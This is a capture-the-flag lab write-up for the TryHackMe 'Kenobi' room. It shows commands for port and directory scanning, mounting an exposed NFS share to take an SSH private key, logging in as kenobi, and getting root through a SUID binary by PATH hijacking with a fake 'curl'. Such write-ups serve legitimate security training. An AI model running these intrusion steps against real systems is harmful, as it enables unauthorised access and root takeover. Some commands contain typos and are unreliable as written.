# Try Hack Me - Kenobi
# Author: Atharva Bordavekar
# Difficulty: Easy
# Points: 88
# Vulnerabilities: SSH private keys available on nfs, 

# Phase 1 - Reconnaissance:

nmap scan:

```bash
nmap -sV -sC <target_ip>
```

PORT     STATE SERVICE     VERSION

21/tcp   open  ftp         ProFTPD 1.3.5

22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)

80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))

111/tcp  open  rpcbind     2-4 (RPC #100000)

139/tcp  open  netbios-ssn Samba smbd 4

445/tcp  open  netbios-ssn Samba smbd 4

2049/tcp open  nfs         3-4 (RPC #100003)

okay so this looks like a classic ctf where the access to ftp will require a username and a password. the passwords could be possibly found in the nfs shares and it will be going from one service to another in search of finding hints until we get the initial foothold. so first we start with enumerating the webserver at port 80 to find any leads.
visiting the page manually we find a .jpg image of starwar characters. we download the image in case of steganography related problems in upcoming enumeration. 

we run gobuster on the website

```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt
```
we get the results as 

/.htaccess            (Status: 403) [Size: 277]

/.hta                 (Status: 403) [Size: 277]

/.htpasswd            (Status: 403) [Size: 277]

/index.html           (Status: 200) [Size: 200]

/robots.txt           (Status: 200) [Size: 36]

/server-status        (Status: 403) [Size: 277]

we immediately visit the /robots.txt and find out that it disallows /admin.html

after visiting /admin.html we find out that it was just a prank by the creator of the room which displays a gif of an alien saying that "it's a trap"

anyways there is nothing much we can do about the website fot the time being so we will move on to enumerating the other services. 

lets start with enumerating the nfs share on port 2049

```bash
showmountt -e <target_ip>
#this will reveal any possible exports on nfs
```
we find a /var share on the nfs service. lets quickly mount this to our system.

```bash
sudo mount -t nfs <target_ip>:nfs/var /tmp/kenobi_nfs
```

we visit the /tmp/kenobi_nfs directory on our system and then we find all the files that would exist on the shell of the system which hosts the webserver. after some manual enumeration, we find the id_rsa in the /tmp directory of the nfs export (actual path /tmp/kenobi_nfs/tmp if you are naming the exports exactly the same way i am). no we copy the id_rsa and save it in a file. the only users we know currently are ubuntu and root. so lets enumerate the samba service to get some intel on the services running on ports 139 and 445.

first lets find out what shares are present on the smb service

```bash
smbclient -L <target_ip> -N
```

Sharename       Type      Comment
      
print$          Disk      Printer Drivers
        
anonymous       Disk      
        
IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))

the anonymous share looks interesting, lets find out what we can get from this share. 

```bash
smblcient //<target_ip>/anonymous
```
we find a log.txt file

```bash
#now tranfer the log.txt file to your system
get log.txt
```
# Phase 2 - Initial Foothold:
now after viewing the contents of the file, we find out the id_rsa that we found before is supposed to be the private key for the user kenobi. since we already have the id_rsa we can directly access the ssh shell with ease.

```bash
chmod 600 id_rsa
```

now we can access the ssh shell of the user kenobi given that we have the appropriate permissions on the id_rsa

```bash
ssh -i id_rsa kenobi@<target_ip>
```
we have a shell as kenobi! now we read and submit the user.txt flag and then move on to the privilege escalation part.

the ctf hints us towards a custom suid which will be the main attack vector to gain a root shell.

```bash
find / -type f -perm -4000 2>/dev/null
```
now we can find a plethora of suids. since most of them are default and common, we ignore them and focus on the suid which seems odd. we have a /usr/bin/menu. this is our primary attack vector. lets use the srtings command to find out what is happening 

```bash
strings /usr/bin/menu
```
so we find the system() in the line system@@GLIBC_2.2.5. this means the binary is using system() in order to run the commands like curl and ifconfig.

the format of the command being processed would be:

-> user inputs 1 (status check)
-> binary uses system("curl -I localhost") in the system() function. now we can see that the curl. 
-> PATH enivronment variable searches each directory from left to right for the curl command.
-> it executes the first match it finds

# Phase 3 - Privilege Escalation:
so having learnt this we can hijack the path to run our own curl file which will have the command /bin/bash as its contents and we will manipulate the path to the path where our malicious curl file is located at.

```bash
#navigate to the /tmp directory
cd /tmp
#now create the malicious curl file
echo /bin/bash > curl
```

now we have to set the permissions for everyone to be able to execute the file includig root

```bash
chmod 777 curl
```

now we manipulate the PATH environment variable

```bash
export PATH =/tmp:$PATH
```

now we run the /usr/bin/menu file for the process to trigger

```bash
/usr/bin/menu
```

and there we go lads, we have a root shell via PATH manipulation. we read the root.txt flag and submit it
